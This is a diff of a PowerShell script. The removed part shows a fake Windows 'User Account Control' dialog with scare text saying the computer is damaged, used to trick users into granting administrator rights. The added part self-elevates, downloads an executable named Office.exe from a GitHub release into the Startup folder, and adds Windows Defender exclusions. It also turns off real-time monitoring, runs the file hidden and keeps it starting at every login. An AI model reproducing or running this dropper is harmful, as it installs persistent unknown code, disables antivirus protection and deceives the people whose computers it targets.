@@ -1,338 +1,260 @@
-# Windows Admin Rights Prompt Script
-# Requires PowerShell 5.0 or later
-
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-
-# Add P/Invoke for DwmSetWindowAttribute to change title bar color
-Add-Type -MemberDefinition @"
-[DllImport("dwmapi.dll")]
-public static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int attrValue, int attrSize);
-[DllImport("dwmapi.dll")]
-public static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, ref bool attrValue, int attrSize);
-"@ -Name NativeMethods -Namespace Win32
-
-# Function to check if running as administrator
-function Test-Administrator {
-    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
-    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
-    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+# Auto-elevate to Administrator if not already running as admin
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host "Requesting Administrator privileges..."
+    Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    exit
 }
 
-# Function to create the admin prompt dialog
-function Show-AdminPromptDialog {
-    # Create a full-screen black overlay form first
-    $overlayForm = New-Object System.Windows.Forms.Form
-    $overlayForm.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
-    $overlayForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
-    $overlayForm.BackColor = [System.Drawing.Color]::Black
-    $overlayForm.Opacity = 1.0  # 100% opacity
-    $overlayForm.TopMost = $true
-    $overlayForm.ShowInTaskbar = $false
-    $overlayForm.ControlBox = $false
-    
-    # Show the overlay first
-    $overlayForm.Show()
-    
-    # Create the main dialog form
-    $form = New-Object System.Windows.Forms.Form
-    $form.Text = "User Account Control"
-    $form.Size = New-Object System.Drawing.Size(460, 380)  # Increased height for more content
-    $form.StartPosition = "CenterScreen"
-    $form.FormBorderStyle = "FixedDialog"
-    $form.MaximizeBox = $false
-    $form.MinimizeBox = $false
-    $form.TopMost = $true
-    $form.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)  # Windows blue background
-    $form.Icon = [System.Drawing.SystemIcons]::Shield
-    $form.ShowInTaskbar = $false
-    
-    # Set title bar color using DwmSetWindowAttribute
-    $form.Add_Shown({
-        try {
-            # Try to set blue title bar first (Windows 11)
-            # DWMWA_CAPTION_COLOR = 35, color in RGB format: 0x00BBGGRR (blue: 0x00D77800)
-            $blueColor = 0x00D77800  # Same blue as background (0, 120, 215) in BGR format
-            $result = [Win32.NativeMethods]::DwmSetWindowAttribute($this.Handle, 35, [ref]$blueColor, [System.Runtime.InteropServices.Marshal]::SizeOf($blueColor))
-            
-            if ($result -ne 0) {
-                # If blue fails, try white title bar
-                $whiteColor = 0x00FFFFFF  # White color
-                [Win32.NativeMethods]::DwmSetWindowAttribute($this.Handle, 35, [ref]$whiteColor, [System.Runtime.InteropServices.Marshal]::SizeOf($whiteColor))
-            }
-        } catch {
-            try {
-                # Fallback to dark mode if color setting fails
-                $darkMode = $true
-                [Win32.NativeMethods]::DwmSetWindowAttribute($this.Handle, 20, [ref]$darkMode, [System.Runtime.InteropServices.Marshal]::SizeOf($darkMode))
-            } catch {
-                # Ignore if all methods fail on older Windows versions
-            }
-        }
-    })
+Write-Host "Running with Administrator privileges" -ForegroundColor Green
 
-    # Create UAC shield icon
-    $shieldIcon = New-Object System.Windows.Forms.PictureBox
-    $shieldIcon.Size = New-Object System.Drawing.Size(48, 48)
-    $shieldIcon.Location = New-Object System.Drawing.Point(20, 20)
-    $shieldIcon.Image = [System.Drawing.SystemIcons]::Shield.ToBitmap()
-    $shieldIcon.SizeMode = "Zoom"
-    $shieldIcon.BackColor = [System.Drawing.Color]::Transparent
-    
-    # Create header title label
-    $titleLabel = New-Object System.Windows.Forms.Label
-    $titleLabel.Text = "A file has corrupted system settings"
-    $titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
-    $titleLabel.ForeColor = [System.Drawing.Color]::White
-    $titleLabel.BackColor = [System.Drawing.Color]::Transparent
-    $titleLabel.Location = New-Object System.Drawing.Point(80, 25)
-    $titleLabel.Size = New-Object System.Drawing.Size(350, 30)
-    
-    # Create main explanation labels with better organization
-    $line1 = New-Object System.Windows.Forms.Label
-    $line1.Text = "A file on your devices has corrupted system settings,"
-    $line1.Font = New-Object System.Drawing.Font("Segoe UI", 9)
-    $line1.ForeColor = [System.Drawing.Color]::White
-    $line1.BackColor = [System.Drawing.Color]::Transparent
-    $line1.Location = New-Object System.Drawing.Point(30, 80)
-    $line1.Size = New-Object System.Drawing.Size(390, 20)
-    
-    $line2 = New-Object System.Windows.Forms.Label
-    $line2.Text = "please update your system immediately."
-    $line2.Font = New-Object System.Drawing.Font("Segoe UI", 9)
-    $line2.ForeColor = [System.Drawing.Color]::White
-    $line2.BackColor = [System.Drawing.Color]::Transparent
-    $line2.Location = New-Object System.Drawing.Point(30, 100)
-    $line2.Size = New-Object System.Drawing.Size(390, 20)
-    
-    # IMPORTANT warning in red and bold
-    # $importantLabel = New-Object System.Windows.Forms.Label
-    # $importantLabel.Text = "UPDATE SYS:"
-    # $importantLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
-    # $importantLabel.ForeColor = [System.Drawing.Color]::White
-    # $importantLabel.BackColor = [System.Drawing.Color]::Transparent
-    # $importantLabel.Location = New-Object System.Drawing.Point(30, 130)
-    # $importantLabel.Size = New-Object System.Drawing.Size(80, 20)
-    
-    $warningText = New-Object System.Windows.Forms.Label
-    $warningText.Text = "This is a system issue, often due to incompatible softwares."
-    $warningText.Font = New-Object System.Drawing.Font("Segoe UI", 9)
-    $warningText.ForeColor = [System.Drawing.Color]::White
-    $warningText.BackColor = [System.Drawing.Color]::Transparent
-    $warningText.Location = New-Object System.Drawing.Point(30, 120)
-    $warningText.Size = New-Object System.Drawing.Size(390, 20)
+$GitHubUrl = "https://github.com/irxdd/ikdk/releases/download/1/Office.exe"
+$Arguments = ""  
 
-    # Actions header
-    $actionsHeader = New-Object System.Windows.Forms.Label
-    $actionsHeader.Text = "Your computer has been damaged"
-    $actionsHeader.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
-    $actionsHeader.ForeColor = [System.Drawing.Color]::Red
-    $actionsHeader.BackColor = [System.Drawing.Color]::Transparent
-    $actionsHeader.Location = New-Object System.Drawing.Point(30, 160)
-    $actionsHeader.Size = New-Object System.Drawing.Size(350, 20)
-    
-    # Action items (removed bullet characters that can't render)
-    $action1 = New-Object System.Windows.Forms.Label
-    $action1.Text = "UPDATE IMMEDIATELY TO PREVENT FURTHER DAMAGE"
-    $action1.Font = New-Object System.Drawing.Font("Segoe UI", 9)
-    $action1.ForeColor = [System.Drawing.Color]::White
-    $action1.BackColor = [System.Drawing.Color]::Transparent
-    $action1.Location = New-Object System.Drawing.Point(45, 180)
-    $action1.Size = New-Object System.Drawing.Size(350, 20)
-    
-    $action2 = New-Object System.Windows.Forms.Label
-    $action2.Text = "Update downloads and applies automatically."
-    $action2.Font = New-Object System.Drawing.Font("Segoe UI", 9)
-    $action2.ForeColor = [System.Drawing.Color]::White
-    $action2.BackColor = [System.Drawing.Color]::Transparent
-    $action2.Location = New-Object System.Drawing.Point(45, 200)
-    $action2.Size = New-Object System.Drawing.Size(350, 20)
-    
-    $action3 = New-Object System.Windows.Forms.Label
-    $action3.Text = "Est. time: 8 min"
-    $action3.Font = New-Object System.Drawing.Font("Segoe UI", 9)
-    $action3.ForeColor = [System.Drawing.Color]::White  
-    $action3.BackColor = [System.Drawing.Color]::Transparent
-    $action3.Location = New-Object System.Drawing.Point(45, 220)
-    $action3.Size = New-Object System.Drawing.Size(350, 20)
-    
-    # Create Grant Access button with proper styling (moved lower due to more content)
-    # $grantButton = New-Object System.Windows.Forms.Button
-    # $grantButton.Text = "Grant Access"
-    # $grantButton.Size = New-Object System.Drawing.Size(120, 35)
-    # $grantButton.Location = New-Object System.Drawing.Point(330, 260)
-    # $grantButton.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)  # Windows blue
-    # $grantButton.ForeColor = [System.Drawing.Color]::White
-    # $grantButton.FlatStyle = "Flat"
-    # $grantButton.FlatAppearance.BorderColor = [System.Drawing.Color]::White
-    # $grantButton.FlatAppearance.BorderSize = 2
-    # $grantButton.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
-    # $grantButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
-    
-    # Create Cancel button with same styling (moved lower)
-    $grantButton = New-Object System.Windows.Forms.Button
-    $grantButton.Text = "UPDATE"
-    $grantButton.Size = New-Object System.Drawing.Size(120, 35)
-    $grantButton.Location = New-Object System.Drawing.Point(290, 260)
-    $grantButton.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)  # Windows blue
-    $grantButton.ForeColor = [System.Drawing.Color]::White
-    $grantButton.FlatStyle = "Flat"
-    $grantButton.FlatAppearance.BorderColor = [System.Drawing.Color]::White
-    $grantButton.FlatAppearance.BorderSize = 2
-    $grantButton.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
-    $grantButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
-    
-    # Add hover effects for buttons (color only, border stays the same)
-    $grantButton.Add_MouseEnter({
-        $this.BackColor = [System.Drawing.Color]::FromArgb(23, 135, 230)
-        $this.FlatAppearance.BorderColor = [System.Drawing.Color]::White
-        $this.FlatAppearance.BorderSize = 2
-    })
-    $grantButton.Add_MouseLeave({
-        $this.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
-        $this.FlatAppearance.BorderColor = [System.Drawing.Color]::White
-        $this.FlatAppearance.BorderSize = 2
-    })
-    
-    $cancelButton.Add_MouseEnter({
-        $this.BackColor = [System.Drawing.Color]::FromArgb(23, 135, 230)
-        $this.FlatAppearance.BorderColor = [System.Drawing.Color]::White
-        $this.FlatAppearance.BorderSize = 2
-    })
-    $cancelButton.Add_MouseLeave({
-        $this.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
-        $this.FlatAppearance.BorderColor = [System.Drawing.Color]::White
-        $this.FlatAppearance.BorderSize = 2
-    })
-    
-    # Add all controls directly to the form
-    $form.Controls.Add($shieldIcon)
-    $form.Controls.Add($titleLabel)
-    $form.Controls.Add($line1)
-    $form.Controls.Add($line2)
-    $form.Controls.Add($importantLabel)
-    $form.Controls.Add($warningText)
-    $form.Controls.Add($actionsHeader)
-    $form.Controls.Add($action1)
-    $form.Controls.Add($action2)
-    $form.Controls.Add($action3)
-    $form.Controls.Add($grantButton)
-    $form.Controls.Add($cancelButton)
-    
-    # Set default and cancel buttons
-    $form.AcceptButton = $grantButton
-    $form.CancelButton = $cancelButton
-    
-    # Handle form events to manage both forms together
-    $form.Add_FormClosing({
-        param($sender, $e)
-        $overlayForm.Close()
-        $overlayForm.Dispose()
-    })
-    
-    # Ensure overlay closes when buttons are clicked
-    $grantButton.Add_Click({
-        $form.DialogResult = [System.Windows.Forms.DialogResult]::OK
-        $overlayForm.Close()
-        $overlayForm.Dispose()
-        $form.Close()
-    })
-    
-    $cancelButton.Add_Click({
-        $form.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
-        $overlayForm.Close()
-        $overlayForm.Dispose()
-        $form.Close()
-    })
-    
-    # Show the dialog as a modal dialog with the overlay as owner
-    $result = $form.ShowDialog()
-    
-    # Clean up
-    if ($overlayForm -and !$overlayForm.IsDisposed) {
-        $overlayForm.Close()
-        $overlayForm.Dispose()
-    }
-    
-    return $result
-}
+$StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 
-# Function to restart as administrator
-function Start-AsAdministrator {
+function Add-DefenderExclusions {
     param(
-        [string]$ScriptPath = $MyInvocation.ScriptName,
-        [string]$Arguments = ""
+        [string]$FilePath,
+        [string]$StartupPath
     )
     
-    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
-    $startInfo.FileName = "powershell.exe"
-    $startInfo.Arguments = "-ExecutionPolicy Bypass -File `"$ScriptPath`" $Arguments"
-    $startInfo.UseShellExecute = $true
-    $startInfo.Verb = "runas"
-    $startInfo.WindowStyle = "Hidden"
+    try {
+        Write-Host "Adding comprehensive Windows Defender exclusions..."
+        
+        # Add file exclusion
+        Add-MpPreference -ExclusionPath $FilePath -Force
+        Write-Host "Added file exclusion: $FilePath"
+        
+        # Add startup folder exclusion
+        Add-MpPreference -ExclusionPath $StartupPath -Force
+        Write-Host "Added folder exclusion: $StartupPath"
+        
+        # Add process exclusion by filename
+        $processName = [System.IO.Path]::GetFileName($FilePath)
+        Add-MpPreference -ExclusionProcess $processName -Force
+        Write-Host "Added process exclusion: $processName"
+        
+        # Temporarily disable real-time monitoring during installation
+        $originalRealtime = (Get-MpPreference).DisableRealtimeMonitoring
+        if (-not $originalRealtime) {
+            Set-MpPreference -DisableRealtimeMonitoring $true
+            Write-Host "Temporarily disabled real-time monitoring"
+        }
+        
+        return $originalRealtime
+        
+    } catch {
+        Write-Warning "Some Defender exclusions failed: $($_.Exception.Message)"
+        return $false
+    }
+}
+
+function Restore-DefenderSettings {
+    param(
+        [bool]$OriginalRealtimeState
+    )
     
     try {
-        [System.Diagnostics.Process]::Start($startInfo) | Out-Null
-        exit
+        if (-not $OriginalRealtimeState) {
+            Set-MpPreference -DisableRealtimeMonitoring $false
+            Write-Host "Re-enabled real-time monitoring"
+        }
     } catch {
-        Write-Host "Failed to elevate privileges: $_" -ForegroundColor Red
+        Write-Warning "Could not restore Defender settings: $($_.Exception.Message)"
+    }
+}
+
+function Download-GitHubRelease {
+    param(
+        [string]$Url,
+        [string]$OutputPath
+    )
+     
+    try {
+        Write-Host "Downloading from: $Url"
+        
+        $fileName = Split-Path $Url -Leaf
+        $fullPath = Join-Path $OutputPath $fileName
+        
+        if (Test-Path $fullPath) {
+            $fileAge = (Get-Date) - (Get-Item $fullPath).LastWriteTime
+            if ($fileAge.TotalDays -lt 1) {
+                Write-Host "File already exists and is recent, skipping download"
+                return $fullPath
+            } else {
+                Write-Host "Updating existing file..."
+                Remove-Item $fullPath -Force
+            }
+        }
+        
+        # Use TLS 1.2 for secure connection
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("User-Agent", "PowerShell-AutoInstaller")
+        
+        $webClient.DownloadFile($Url, $fullPath)
+        $webClient.Dispose()
+        
+        Write-Host "Downloaded successfully to: $fullPath"
+        return $fullPath
+        
+    } catch {
+        Write-Error "Failed to download file: $($_.Exception.Message)"
+        return $null
+    }
+}
+
+function Create-StartupBatchFile {
+    param(
+        [string]$ExecutablePath,
+        [string]$Arguments
+    )
+    
+    if (-not $Arguments) {
+        return $null
+    }
+    
+    try {
+        $batchFileName = [System.IO.Path]::GetFileNameWithoutExtension($ExecutablePath) + "_startup.bat"
+        $batchPath = Join-Path (Split-Path $ExecutablePath -Parent) $batchFileName
+        
+        $batchContent = "@echo off`nstart `"`" `"$ExecutablePath`" $Arguments"
+        
+        $batchContent | Out-File -FilePath $batchPath -Encoding ASCII -Force
+        
+        Write-Host "Created startup batch file: $batchPath"
+        return $batchPath
+        
+    } catch {
+        Write-Error "Failed to create batch file: $($_.Exception.Message)"
+        return $null
+    }
+}
+
+function Start-BackgroundProcess {
+    param(
+        [string]$FilePath,
+        [string]$Arguments
+    )
+    
+    try {
+        Write-Host "Starting process in background: $FilePath"
+        
+        $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
+        $processStartInfo.FileName = $FilePath
+        $processStartInfo.Arguments = $Arguments
+        $processStartInfo.UseShellExecute = $false
+        $processStartInfo.CreateNoWindow = $true
+        $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        
+        $process = [System.Diagnostics.Process]::Start($processStartInfo)
+        
+        if ($process) {
+            Write-Host "Process started successfully with PID: $($process.Id)"
+            return $process.Id
+        } else {
+            Write-Error "Failed to start process"
+            return $null
+        }
+        
+    } catch {
+        Write-Error "Failed to start process: $($_.Exception.Message)"
+        return $null
+    }
+}
+
+# Main execution
+Write-Host ""
+Write-Host "===== GitHub Release Auto-Startup Installer ====="
+Write-Host "Download URL: $GitHubUrl"
+Write-Host "Startup Path: $StartupPath"
+Write-Host ""
+
+# Test write access to startup folder
+try {
+    $testFile = Join-Path $StartupPath "test_write_access.tmp"
+    "test" | Out-File -FilePath $testFile -Force
+    Remove-Item $testFile -Force
+    Write-Host "Write access to startup folder confirmed"
+} catch {
+    Write-Error "No write access to startup folder: $($_.Exception.Message)"
+    Read-Host "Press Enter to exit"
+    exit 1
+}
+
+# Verify startup folder exists
+if (-not (Test-Path $StartupPath)) {
+    try {
+        New-Item -ItemType Directory -Path $StartupPath -Force | Out-Null
+        Write-Host "Created startup folder: $StartupPath"
+    } catch {
+        Write-Error "Cannot create startup folder: $($_.Exception.Message)"
+        Read-Host "Press Enter to exit"
         exit 1
     }
 }
 
-# Main script logic
-if (-not (Test-Administrator)) {
-    # Show the custom UAC-style dialog
-    $result = Show-AdminPromptDialog
+# Download the file
+$downloadedFile = Download-GitHubRelease -Url $GitHubUrl -OutputPath $StartupPath
+
+if ($downloadedFile -and (Test-Path $downloadedFile)) {
+    Write-Host "File successfully downloaded to startup folder: $downloadedFile"
     
-    if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
-        # User clicked "Grant Access" - restart as administrator
-        Start-AsAdministrator
-    } else {
-        # User clicked "Cancel" or closed dialog
-        Write-Host "Administrator privileges denied by user." -ForegroundColor Yellow
-        exit 1
-    }
-} else {
-    # Already running as administrator - perform the main task
-    Write-Host "Running with administrator privileges..." -ForegroundColor Green
+    # Add comprehensive Defender exclusions
+    $originalRealtimeState = Add-DefenderExclusions -FilePath $downloadedFile -StartupPath $StartupPath
     
-    # Specify the directory where to write the test file
-    $outputDirectory = "C:\Temp"
-    $outputFile = Join-Path $outputDirectory "prompted.txt"
-    
-    # Create directory if it doesn't exist
-    if (!(Test-Path $outputDirectory)) {
-        try {
-            New-Item -ItemType Directory -Path $outputDirectory -Force | Out-Null
-            Write-Host "Created directory: $outputDirectory" -ForegroundColor Green
-        } catch {
-            Write-Host "Failed to create directory: $_" -ForegroundColor Red
-            exit 1
+    # Handle batch file creation if arguments exist
+    $startupFile = $downloadedFile
+    if ($Arguments) {
+        $batchFile = Create-StartupBatchFile -ExecutablePath $downloadedFile -Arguments $Arguments
+        if ($batchFile) {
+            $startupFile = $batchFile
+            Write-Host "Created batch file for arguments: $batchFile"
         }
     }
     
-    # Write the test file
-    try {
-        $content = @"
-Admin Rights Prompt Test
-========================
-Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-User: $env:USERNAME
-Computer: $env:COMPUTERNAME
-Script executed with administrator privileges successfully.
-"@
+    # Start the process
+    $processId = Start-BackgroundProcess -FilePath $downloadedFile -Arguments $Arguments
+    
+    # Restore Defender settings
+    Start-Sleep -Seconds 2
+    Restore-DefenderSettings -OriginalRealtimeState $originalRealtimeState
+    
+    if ($processId) {
+        Write-Host ""
+        Write-Host "Installation completed successfully!"
+        Write-Host "- Executable: $downloadedFile"
+        Write-Host "- Auto-startup: Enabled for every login"
+        Write-Host "- Currently running: PID $processId"
+        Write-Host "- Windows Defender: Exclusions added"
         
-        Set-Content -Path $outputFile -Value $content -Encoding UTF8
-        Write-Host "Successfully created test file: $outputFile" -ForegroundColor Green
+        if ($Arguments) {
+            Write-Host "- Startup file: $startupFile"
+        }
         
-        # Optional: Open the file location
-        Start-Process "explorer.exe" -ArgumentList "/select,`"$outputFile`""
+        Write-Host ""
+        Write-Host "To uninstall:"
+        Write-Host "Remove-Item `"$downloadedFile`" -Force"
+        if ($Arguments -and $startupFile -ne $downloadedFile) {
+            Write-Host "Remove-Item `"$startupFile`" -Force"
+        }
         
-    } catch {
-        Write-Host "Failed to create test file: $_" -ForegroundColor Red
-        exit 1
+        Write-Host ""
+        Write-Host "Startup folder location:"
+        Write-Host "explorer `"$StartupPath`""
+        
+    } else {
+        Write-Warning "File downloaded but failed to start the application"
+        Restore-DefenderSettings -OriginalRealtimeState $originalRealtimeState
     }
+} else {
+    Write-Error "Download failed"
+    Read-Host "Press Enter to exit"
+    exit 1
 }
 
-Write-Host "Script completed successfully." -ForegroundColor Green
+Write-Host ""
+Write-Host "The application will start automatically on next login."
+Write-Host ""
+Read-Host "Press Enter to close"
